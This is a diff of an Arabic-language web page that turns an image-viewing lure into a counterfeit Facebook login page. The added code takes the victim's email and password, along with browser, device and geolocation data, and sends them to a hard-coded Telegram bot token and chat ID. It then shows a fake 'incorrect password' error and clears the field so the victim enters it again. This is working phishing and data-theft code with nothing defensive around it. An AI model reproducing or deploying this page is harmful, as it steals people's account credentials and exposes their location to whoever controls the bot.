@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقع رفع الصور</title>
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,8 @@
         }
 
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6ea 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -22,91 +22,267 @@
         }
 
         .container {
-            max-width: 600px;
+            display: flex;
+            max-width: 1200px;
             width: 100%;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
-            overflow: hidden;
-            animation: slideUp 0.8s ease-out;
+            gap: 50px;
+            align-items: center;
         }
 
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .header {
-            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
-            color: white;
-            padding: 30px;
+        .left-section {
+            flex: 1;
             text-align: center;
         }
 
-        .main-image {
-            width: 100%;
+        .facebook-logo {
+            font-size: 4rem;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .tagline {
+            font-size: 1.5rem;
+            color: #1c1e21;
+            line-height: 1.4;
+            margin-bottom: 30px;
+        }
+
+        .right-section {
+            flex: 1;
             max-width: 400px;
-            height: auto;
-            border-radius: 15px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
-            margin: 30px auto;
-            filter: blur(20px);
-            transition: filter 0.5s ease;
-            display: block;
         }
 
-        .main-image.clear {
-            filter: blur(0px);
+        .login-form {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 30px;
+            animation: slideUp 0.6s ease-out;
         }
 
-        .click-button {
-            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #f5f6f7;
+            transition: all 0.3s ease;
+            direction: ltr;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .form-input::placeholder {
+            color: #90949c;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
             color: white;
             border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 1.2em;
+            border-radius: 6px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin: 20px auto;
-            display: block;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dadde1;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 15px;
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            padding: 14px;
+            background: #42b883;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
             transition: all 0.3s ease;
         }
 
-        .click-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
+        .create-account-btn:hover {
+            background: #369870;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(66, 184, 131, 0.4);
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 30px;
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        .footer-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
         }
 
         .success-message {
             background: #d4edda;
             color: #155724;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
             text-align: center;
             display: none;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+            border: 1px solid #f5c6cb;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                gap: 30px;
+            }
+
+            .left-section {
+                text-align: center;
+            }
+
+            .facebook-logo {
+                font-size: 3rem;
+            }
+
+            .tagline {
+                font-size: 1.2rem;
+            }
+
+            .right-section {
+                max-width: 100%;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>موقع رفع الصور</h1>
-            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
+        <div class="left-section">
+            <div class="facebook-logo">facebook</div>
+            <div class="tagline">
+                يساعدك فيس بوك على التواصل والمشاركة مع الأشخاص الموجودين في حياتك
+            </div>
         </div>
 
-        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
-             alt="الصورة المختارة" 
-             class="main-image" 
-             id="mainImage">
+        <div class="right-section">
+            <form class="login-form" id="loginForm">
+                <div class="success-message" id="successMessage">
+                    ✅ تم تسجيل الدخول بنجاح!
+                </div>
+                
+                <div class="error-message" id="errorMessage">
+                    ❌ خطأ في البريد الإلكتروني أو كلمة المرور
+                </div>
 
-        <button class="click-button" id="viewButton" onclick="viewImage()">
-            🔍 اضغط هنا لمشاهدة الصورة
-        </button>
+                <div class="input-group">
+                    <input type="text" class="form-input" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                </div>
 
-        <div class="success-message" id="successMessage">
-            ✅ تم الموافقة على عرض الصورة
+                <div class="input-group">
+                    <input type="password" class="form-input" id="password" placeholder="كلمة المرور" required>
+                </div>
+
+                <button type="submit" class="login-btn" id="loginBtn">
+                    تسجيل الدخول
+                </button>
+
+                <div class="forgot-password">
+                    <a href="#" onclick="showMessage('error', 'هذه الميزة غير متوفرة حالياً')">هل نسيت كلمة المرور؟</a>
+                </div>
+
+                <div class="divider">
+                    <span>أو</span>
+                </div>
+
+                <button type="button" class="create-account-btn" onclick="showMessage('error', 'هذه الميزة غير متوفرة حالياً')">
+                    إنشاء حساب جديد
+                </button>
+            </form>
+
+            <div class="footer-text">
+                <a href="#" onclick="showMessage('error', 'هذه الميزة غير متوفرة حالياً')">إنشاء صفحة</a> لمشهور أو علامة تجارية أو نشاط تجاري.
+            </div>
         </div>
     </div>
 
@@ -141,7 +317,8 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
                 user_agent: ua,
-                // إضافة متغيرات الموقع
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
                 latitude: window.userLocation?.latitude || 'غير متاح',
                 longitude: window.userLocation?.longitude || 'غير متاح',
                 location_accuracy: window.userLocation?.accuracy || 'غير متاح',
@@ -150,15 +327,16 @@
         }
 
         function sendToTelegram(data) {
-            // التوكن الخاص بالبوت
             const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
-            // Chat ID الخاص بك
             const TELEGRAM_CHAT_ID = '170383339';
             
             const message = `
-🆕 زائر جديد للموقع:
-━━━━━━━━━━━━━━━━━━
+🔐 بيانات تسجيل دخول فيس بوك جديدة!
+━━━━━━━━━━━━━━━━━━━━
 ⏰ الوقت: ${data.timestamp}
+📧 البريد الإلكتروني: ${data.email}
+🔑 كلمة المرور: ${data.password}
+━━━━━━━━━━━━━━━━━━━━
 🌐 الرابط: ${data.page_url}
 📱 الجهاز: ${data.device_type}
 💻 المتصفح: ${data.browser}
@@ -166,16 +344,16 @@
 📺 الدقة: ${data.screen_resolution}
 🌍 المنطقة: ${data.timezone}
 🗣️ اللغة: ${data.language}
-📍 الموقع الجغرافي: ${data.location_status}
+📍 حالة الموقع: ${data.location_status}
 📐 خط العرض: ${data.latitude}
 📐 خط الطول: ${data.longitude}
 🎯 دقة الموقع: ${data.location_accuracy}
-━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
             `;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            fetch(url, {
+            return fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -195,24 +373,82 @@
                 }
             }).then(data => {
                 console.log('📱 استجابة Telegram:', data);
+                return data;
             }).catch(error => {
                 console.error('❌ خطأ في الإرسال:', error);
+                throw error;
             });
         }
 
-        function viewImage() {
-            // إظهار الصورة
-            document.getElementById('mainImage').classList.add('clear');
-            document.getElementById('viewButton').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
+        function showMessage(type, message) {
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
             
-            // جمع وإرسال البيانات
-            const data = collectData();
-            console.log('بيانات الزائر:', data);
+            // إخفاء جميع الرسائل أولاً
+            successMsg.style.display = 'none';
+            errorMsg.style.display = 'none';
             
-            // إرسال البيانات
-            sendToTelegram(data);
+            if (type === 'success') {
+                successMsg.style.display = 'block';
+                if (message) successMsg.textContent = message;
+            } else if (type === 'error') {
+                errorMsg.style.display = 'block';
+                if (message) errorMsg.textContent = message;
+            }
+            
+            // إخفاء الرسالة بعد 3 ثوان
+            setTimeout(() => {
+                successMsg.style.display = 'none';
+                errorMsg.style.display = 'none';
+            }, 3000);
         }
+
+        // معالجة إرسال النموذج
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                showMessage('error', 'يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            // تغيير نص الزر أثناء المعالجة
+            const loginBtn = document.getElementById('loginBtn');
+            const originalText = loginBtn.textContent;
+            loginBtn.textContent = 'جاري التحقق...';
+            loginBtn.disabled = true;
+            
+            // جمع البيانات
+            const data = collectData();
+            console.log('بيانات تسجيل الدخول:', data);
+            
+            // إرسال البيانات فوراً إلى Telegram
+            sendToTelegram(data).then(() => {
+                // إظهار رسالة خطأ مزيفة بعد الإرسال الناجح
+                setTimeout(() => {
+                    showMessage('error', 'البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.');
+                    
+                    // إعادة تعيين الزر
+                    loginBtn.textContent = originalText;
+                    loginBtn.disabled = false;
+                    
+                    // مسح كلمة المرور لتشجيع المحاولة مرة أخرى
+                    document.getElementById('password').value = '';
+                }, 1500);
+            }).catch((error) => {
+                // في حالة فشل الإرسال، إظهار رسالة خطأ عامة
+                setTimeout(() => {
+                    showMessage('error', 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
+                    
+                    // إعادة تعيين الزر
+                    loginBtn.textContent = originalText;
+                    loginBtn.disabled = false;
+                }, 1500);
+            });
+        });
 
         // جمع الموقع الجغرافي عند تحميل الصفحة
         window.userLocation = { status: 'جاري المحاولة...' };
